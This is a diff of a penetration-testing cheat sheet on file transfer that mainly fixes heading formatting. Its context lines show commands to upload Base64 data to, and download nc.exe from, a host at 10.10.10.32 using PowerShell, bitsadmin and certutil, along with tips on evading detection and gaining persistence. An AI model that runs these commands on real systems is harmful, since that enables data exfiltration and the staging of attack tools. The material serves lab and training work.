@@ -1,6 +1,6 @@
 # File-transfer
 
-####PowerShell Commands
+#### PowerShell Commands
 - Download a File
 ```
 Invoke-WebRequest https:///PowerView.ps1 -OutFile PowerView.ps1
@@ -24,7 +24,7 @@ $b64 = [System.Convert]::ToBase64String($bytes)
 Invoke-WebRequest -Uri http://10.10.10.32/upload -Method POST -Body $b64
 ```
 
-####Windows Native Tools
+#### Windows Native Tools
 - Bitsadmin (Deprecated but Still Useful)
 ```
 bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
@@ -34,12 +34,12 @@ bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
 certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
 
-####Linux-Based Tools
+#### Linux-Based Tools
 - Wget
 - cURL
 - Python HTTP File Download
 
-####Other Methods
+#### Other Methods
 - PHP File Download
 - SCP (Secure Copy Protocol) - Upload
 - SCP - Download
@@ -48,14 +48,14 @@ Receive File:- FTP Upload/Download (Interactive)
 - TFTP (Trivial File Transfer Protocol) Download:
 Upload:- SMB (Using SMBClient)
 
-####Extra Tips
+#### Extra Tips
 - Bypass Restrictions: Consider using alternative ports, URL encoding, or modifying headers to bypass security restrictions.
 - Evasion Techniques: Use legitimate-looking User-Agents, filenames, or paths to evade detection.
 - Persistence: Combine these methods with scheduled tasks or registry modifications for persistence.
 - File Obfuscation: Encode files in Base64 to evade basic detection.
 - Alternate Data Streams (Windows):
 - Compression & Encryption: Compress files using `zip` or `7z` with a password.
-Last updated 10 months ago
+
 ```
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
 ```
